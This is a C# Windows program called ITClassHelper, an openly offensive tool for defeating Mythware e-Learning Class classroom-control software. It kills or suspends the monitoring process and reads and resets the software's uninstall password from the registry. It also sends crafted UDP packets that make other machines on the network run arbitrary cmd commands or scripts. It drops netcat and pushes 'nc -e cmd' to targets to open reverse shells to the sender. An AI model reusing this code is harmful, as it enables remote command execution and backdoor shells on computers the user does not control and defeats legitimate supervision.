using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ITClassHelper
{
    public partial class MainWindow : Form
    {
        public static class ProcessMgr
        {
            [Flags]
            public enum ProcessAccess : uint
            {
                Terminate = 0x1,
                CreateThread = 0x2,
                SetSessionId = 0x4,
                VmOperation = 0x8,
                VmRead = 0x10,
                VmWrite = 0x20,
                DupHandle = 0x40,
                CreateProcess = 0x80,
                SetQuota = 0x100,
                SetInformation = 0x200,
                QueryInformation = 0x400,
                SetPort = 0x800,
                SuspendResume = 0x800,
                QueryLimitedInformation = 0x1000,
                Synchronize = 0x100000
            }

            [DllImport("ntdll.dll")] private static extern uint NtResumeProcess([In] IntPtr processHandle);

            [DllImport("ntdll.dll")] private static extern uint NtSuspendProcess([In] IntPtr processHandle);

            [DllImport("ntdll.dll")] private static extern uint NtTerminateProcess([In] IntPtr processHandle);

            [DllImport("kernel32.dll")]
            private static extern IntPtr OpenProcess(
                ProcessAccess desiredAccess,
                bool inheritHandle,
                int processId
            );

            [DllImport("kernel32.dll")][return: MarshalAs(UnmanagedType.Bool)] private static extern bool CloseHandle([In] IntPtr handle);

            public static void TerminateProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.Terminate, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtTerminateProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }

            public static void SuspendProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtSuspendProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }

            public static void ResumeProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtResumeProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }
        }

        public static class HotKey
        {
            [DllImport("user32.dll")]
            public static extern bool RegisterHotKey(
                IntPtr hWnd,
                int hotkeyId,
                KeyModifiers keyModifiers,
                Keys keys
            );

            [DllImport("user32.dll")]
            public static extern bool UnregisterHotKey(
                IntPtr hWnd,
                int hotkeyId
                );

            [Flags]
            public enum KeyModifiers
            {
                None = 0,
                Alt = 1,
                Ctrl = 2,
                Shift = 4,
                Windows = 8
            }
        }

        public static class PackAttacker
        {
            public static byte[] basePack = new byte[]
            { 0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00, 0x20, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            public static byte[] BuildPack(ArrayList pack)
            {
                int index = 578;
                byte[] result = basePack;
                foreach (int elem in pack)
                {
                    result[index] = (byte)elem;
                    index += 1;
                }
                return result;
            }

            public static ArrayList FormatMsg(string msg)
            {
                ArrayList arr = new ArrayList();
                foreach (char ch in msg)
                {
                    string tmp = "0x" + Convert.ToInt32(ch).ToString("X");
                    int high, low;
                    if (Convert.ToInt32(tmp, 16) > 0xff)
                    {
                        tmp = tmp.Substring(2);
                        high = Convert.ToInt32(tmp.Substring(0, 2), 16);
                        low = Convert.ToInt32(tmp.Substring(2, 2), 16);
                    }
                    else
                    {
                        high = 0;
                        low = Convert.ToInt32(tmp.Substring(2, 2), 16);
                    }
                    arr.Add(low);
                    arr.Add(high);
                }
                return arr;
            }

            public static void SendPack(string msg, string[] ips, int port)
            {
                byte[] finalPack = BuildPack(FormatMsg(msg));
                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                foreach (string ip in ips)
                {
                    client.SendTo(finalPack, new IPEndPoint(IPAddress.Parse(ip), port));
                    Thread.Sleep(1000);
                }
                client.Close();
            }
        }

        readonly MiniController miniController = new MiniController();
        static readonly string ProgramVersion = "2.1.0-d";
        static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ITClassHelper";
        static readonly string ncPath = path + @"\nc.exe";
        static readonly string ntsdPath = path + @"\ntsd.exe";
        static readonly string disableAttackFilePath = path + @"\disableAttack.txt";
        static readonly string allowBackdoorFilePath = path + @"\allowBackdoorAttack.txt";
        static string attackScriptPath, roomPath;
        static bool firstTimeHide = true;
        static bool firstTimeNcClientAttack = true;

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "MoveWindow")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        public MainWindow()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            ProgramAboutLabel.Text = ProgramAboutLabel.Text.Replace("X.Y.Z", ProgramVersion);
            miniController.Show();
            miniController.Hide();
            HotKey.RegisterHotKey(Handle, 100, HotKey.KeyModifiers.Alt, Keys.H);
            if (ProgramVersion.Contains("-d")) MessageBox.Show("这是一个内测版本，尚不稳定，请小心操作！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName("ITClassHelper").Length > 1)
            {
                MessageBox.Show("机房助手已在运行！点击[确认]退出当前进程！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            Directory.CreateDirectory(path);

            if (File.Exists(disableAttackFilePath))
            {
                DisableAttackButton.Enabled = false;
                AttackButton.Enabled = false;
            }

            if (File.Exists(allowBackdoorFilePath))
            {
                NcServerButton.Visible = NcServerButton.Enabled = NcClientButton.Enabled = true;
            }

            if (!File.Exists(ntsdPath))
            {
                byte[] RescNtsd = Properties.Resources.Ntsd;
                FileStream ntsdFsObj = new FileStream(ntsdPath, FileMode.CreateNew);
                ntsdFsObj.Write(RescNtsd, 0, RescNtsd.Length);
                ntsdFsObj.Close();
            }

            byte[] RescNetCat = Properties.Resources.NetCat;
            FileStream netCatFsObj = new FileStream(ncPath, FileMode.Create);
            netCatFsObj.Write(RescNetCat, 0, RescNetCat.Length);
            netCatFsObj.Close();

            new Thread(LoopThread) { IsBackground = true }.Start();
        }

        private void LoopThread()
        {
            while (true)
            {
                IntPtr studentWindow = FindWindow(null, "屏幕演播室窗口");
                if (MousePosition == new Point(0, 0))
                {
                    MoveWindow(studentWindow, miniController.Size.Width, miniController.Size.Height, 1000, 500, true);
                    miniController.Show();
                }
                if (GetStudentProcs().Length == 0)
                {
                    RoomStatusLabel.Text = "未在运行";
                    RoomStatusLabel.ForeColor = Color.Green;
                }
                else
                {
                    RoomStatusLabel.Text = "正在运行";
                    RoomStatusLabel.ForeColor = Color.Red;
                }
                if (studentWindow != IntPtr.Zero && Visible == true)
                {
                    TopMost = true;
                    Activate();
                    Focus();
                }
                else
                {
                    TopMost = false;
                }
                GetRoomPath("quiet");
                Thread.Sleep(1500);
            }
        }

        private void PauseRoomButton_Click(object sender, EventArgs e) => PauseRoom();

        private void PauseRoom()
        {
            if (GetStudentProcs().Length > 0) ProcessMgr.SuspendProcess(GetStudentProcs()[0].Id);
        }

        private void CloseRoomButton_Click(object sender, EventArgs e) => CloseRoom();

        private void CloseRoom()
        {
            if (GetStudentProcs().Length > 0) ProcessMgr.TerminateProcess(GetStudentProcs()[0].Id);
            if (GetStudentProcs().Length > 0)
            {
                ExecuteProcess(ntsdPath, "-c q -pn StudentMain.exe");
                new Thread(x => { Thread.Sleep(1000); ExecuteProcess("taskkill", "/f /im ntsd.exe"); }).Start();
            }
        }

        private Process[] GetStudentProcs()
        {
            return Process.GetProcessesByName("StudentMain");
        }

        private void ExecuteProcess(string process, string arguments, bool noHide = false)
        {
            Process ExeProcess = new Process();
            ProcessStartInfo ExeProcessInfo = new ProcessStartInfo
            {
                FileName = process,
                Arguments = arguments
            };
            if (noHide != true) ExeProcessInfo.WindowStyle = ProcessWindowStyle.Hidden;
            ExeProcess.StartInfo = ExeProcessInfo;
            ExeProcess.Start();
        }

        private void RecoverRoomButton_Click(object sender, EventArgs e) => RecoverRoom();

        private void RecoverRoom()
        {
            if (GetStudentProcs().Length > 0) ProcessMgr.ResumeProcess(GetStudentProcs()[0].Id);
            else
            {
                if (File.Exists(roomPath)) ExecuteProcess(roomPath, "", true);
                else { GetRoomPath("manual"); }
            }
        }

        private void AttackTypeRadio_CheckedChanged(object sender, EventArgs e)
        {
            CmdTextBox.Enabled = UseCmdRadio.Checked;
            ChooseScriptButton.Enabled = UseScriptRadio.Checked;
            ScripterButton.Enabled = UseScriptRadio.Checked;
        }

        private void AttackButton_Click(object sender, EventArgs e)
        {
            int rangeStart = int.Parse(IPTextBox.Text.Split('.')[3]);
            int rangeEnd = int.Parse(IPRangeTextBox.Text);
            if (rangeEnd - rangeStart >= 5)
            {
                if (MessageBox.Show("攻击数量大于或等于 5 个，攻击速度可能较慢！\n按[确定]继续攻击；\n按[取消]放弃攻击。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel)
                {
                    AttackButton.Enabled = true;
                    AttackButton.Text = "立即攻击";
                    return;
                }
            }
            AttackButton.Enabled = false;
            AttackButton.Text = "正在攻击！";
            for (int curRange = rangeStart; curRange <= rangeEnd; curRange++)
            {
                if (UseCmdRadio.Checked) PackAttacker.SendPack(CmdTextBox.Text, new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                if (UseScriptRadio.Checked)
                {
                    try
                    {
                        using (StreamReader sr = new StreamReader(attackScriptPath))
                        {
                            string fileLine;
                            while ((fileLine = sr.ReadLine()) != null) PackAttacker.SendPack(fileLine, new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                        }
                    }
                    catch (ArgumentNullException) { MessageBox.Show("未选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                }
            }
            AttackButton.Enabled = true;
            AttackButton.Text = "立即攻击";
        }

        private void IPButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show($"IP 地址为：{GetIPAddress()}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private static string GetIPAddress()
        {
            string mainAddress = "ERROR";
            foreach (IPAddress curCheckIP in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (curCheckIP.AddressFamily.ToString() == "InterNetwork")
                {
                    mainAddress = curCheckIP.ToString();
                }
            }
            return mainAddress;
        }

        private void DisableAttackButton_Click(object sender, EventArgs e)
        {
            DisableAttackButton.Enabled = false;
            AttackButton.Enabled = false;
            File.Create(disableAttackFilePath);
        }

        private void UpdateProgramButton_Click(object sender, EventArgs e)
        {
            string startMessage = "echo \"准备更新......\";sleep 3";
            string delUpdateFiles = "echo \"删除旧更新文件......\";del .\\ITClassHelper.exe;del .\\PythonInstaller.exe;del .\\TrollScripts.zip";
            string dlMainProgram = "wget \"https://gitee.com/ujhhgtg/ITClassHelper/raw/master/bin/Release/ITClassHelper.exe\" -O \"ITClassHelper.exe\"";
            string dlPyInstaller = "wget \"https://hub.fastgit.org/UjhhgtgTeams/ITClassHelper/raw/master/bin/Release/PythonInstaller.exe\" -O \"PythonInstaller.exe\"";
            string dlTrollScripts = "wget \"https://gitee.com/ujhhgtg/ITClassHelper/raw/master/bin/Release/TrollScripts.zip\" -O \"TrollScripts.zip\"";
            string cpUpdateFiles = $"echo \"复制更新文件......\";cp \".\\ITClassHelper.exe\" \"{Directory.GetCurrentDirectory()}\\ITClassHelper.exe\";cp \".\\PythonInstaller.exe\" \"{Directory.GetCurrentDirectory()}\\PythonInstaller.exe\";cp \".\\TrollScripts.zip\" \"{Directory.GetCurrentDirectory()}\\TrollScripts.zip\"";
            string endMessage = "echo \"更新完成！将在 3 秒后自动关闭。\";sleep 3";
            string arguments = $"{startMessage};{delUpdateFiles};echo \"下载更新文件......\";{dlMainProgram};{dlPyInstaller};{dlTrollScripts};{cpUpdateFiles};{endMessage};";
            ExecuteProcess("powershell", arguments, true);
            Environment.Exit(0);
        }

        private void ChooseScriptButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "已处理的BAT脚本(*.bat)|*.bat"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                attackScriptPath = fileDialog.FileName;
            }
        }

        private void ConvertNameIPButton_Click(object sender, EventArgs e)
        {
            string finalAddress = "";
            try
            {
                foreach (IPAddress curAddress in Dns.GetHostEntry(PCNameTextBox.Text).AddressList)
                {
                    if (curAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        finalAddress = curAddress.ToString();
                    }
                }
                MessageBox.Show($"目标 IP 地址为：{finalAddress}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (SocketException)
            {
                MessageBox.Show("找不到此计算机！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void GetRoomPathButton_Click(object sender, EventArgs e) => GetRoomPath("manual");

        private void GetRoomPath(string getMethod)
        {
            if (roomPath != null)
            {
                if (getMethod != "quiet") MessageBox.Show("已获取过了教室程序路径！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                if (GetStudentProcs().Length != 0)
                {
                    roomPath = GetStudentProcs()[0].MainModule.FileName;
                    if (getMethod != "quiet") MessageBox.Show("已自动获取到教室程序路径！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    string defaultRoomPath = @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe";
                    if (File.Exists(defaultRoomPath))
                    {
                        roomPath = defaultRoomPath;
                        if (getMethod != "quiet") MessageBox.Show("已自动获取到教室程序路径！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        if (getMethod == "manual")
                        {
                            MessageBox.Show("无法自动找到教室程序路径！请在下一界面手动选择！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            OpenFileDialog fileDialog = new OpenFileDialog
                            {
                                Multiselect = false,
                                Title = "选择教室程序",
                                Filter = "教室程序(*.exe)|*.exe"
                            };
                            if (fileDialog.ShowDialog() == DialogResult.OK)
                            {
                                roomPath = fileDialog.FileName;
                            }
                        }
                    }
                }
            }
        }

        private void GetPswdButton_Click(object sender, EventArgs e)
        {
            RegistryKey pswdKey;
            try
            {
                pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class Standard\1.00");
            }
            catch { pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class\1.00"); }
            string longPswd = (string)pswdKey.GetValue("UninstallPasswd");
            MessageBox.Show($"密码为：{longPswd.Replace("Passwd", "")}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void SetPswdButton_Click(object sender, EventArgs e)
        {
            string keyDir = @"HKEY_LOCAL_MACHINE\SOFTWARE\TopDomain\e-Learning Class Standard\1.00";
            string pswdText = Interaction.InputBox("请输入要设置的密码：", "信息", "defaultPswd", -1, -1);
            if (pswdText != "defaultPswd")
            {
                Registry.SetValue(keyDir, "UninstallPasswd", $@"Passwd{pswdText}");
                new Thread(x => { CloseRoom(); Thread.Sleep(1000); RecoverRoom(); }) { IsBackground = true }.Start();
            }
        }

        private void ScripterButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "原始BAT脚本(*.bat)|*.bat"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                string scriptPath = fileDialog.FileName;
                int lines = 0;
                FileStream fs = new FileStream(scriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                StreamReader lineSr = new StreamReader(fs);
                while (lineSr.ReadLine() != null)
                {
                    lines++;
                }
                fs.Close();
                lineSr.Close();
                string scriptName = Interaction.InputBox("请输入脚本文件名：", "信息", "", -1, -1);
                List<string> newLines = new List<string>(lines + 2);
                using (StreamReader sr = new StreamReader(scriptPath))
                {
                    newLines.Add($@"del /f /q C:\{scriptName}");
                    string line, newLine = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        newLine = "echo ";
                        foreach (char c in line)
                        {
                            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
                                newLine += c;
                            else newLine += "^" + c;
                        }
                        newLine += $@" >>C:\{scriptName}";
                        newLines.Add(newLine);
                    }
                    newLines.Add($@"start C:\{scriptName}");
                }

                using (StreamWriter sw = new StreamWriter(scriptName.Split('.')[0] + ".bat"))
                {
                    foreach (string s in newLines)
                    {
                        sw.WriteLine(s);
                    }
                }
                MessageBox.Show($@"脚本已保存到 {Directory.GetCurrentDirectory()}\{scriptName}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void NcServerButton_Click(object sender, EventArgs e)
        {
            Process[] ncProcs = Process.GetProcessesByName("nc");
            if (ncProcs.Length == 0)
            {
                ExecuteProcess(ncPath, "-lvnp 4242", true);
                NcServerButton.Text = "关闭服务器";
            }
            else
            {
                foreach (Process ncProc in ncProcs) ProcessMgr.TerminateProcess(ncProc.Id);
                NcServerButton.Text = "启动服务器";
            }
        }

        private void NcClientButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(allowBackdoorFilePath)) ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
            else
            {
                PackAttacker.SendPack($"{ncPath} -e cmd {GetIPAddress()} 4242", new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                if (firstTimeNcClientAttack == true)
                {
                    MessageBox.Show("NetCat 客户端只能对一个 IP 地址攻击！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    firstTimeNcClientAttack = false;
                }
            }
        }

        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Hide();
            if (firstTimeHide == true)
            {
                MessageBox.Show("机房助手已自动隐藏到后台，按下 Alt+H 即可显示！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
                firstTimeHide = false;
            }
        }

        private void ExitProgramButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        protected override void WndProc(ref Message msg)
        {
            const int WM_HOTKEY = 0x0312;
            switch (msg.Msg)
            {
                case WM_HOTKEY:
                    switch (msg.WParam.ToInt32())
                    {
                        case 100:
                            Visible = !Visible;
                            break;
                    }
                    break;
            }
            base.WndProc(ref msg);
        }
    }
}
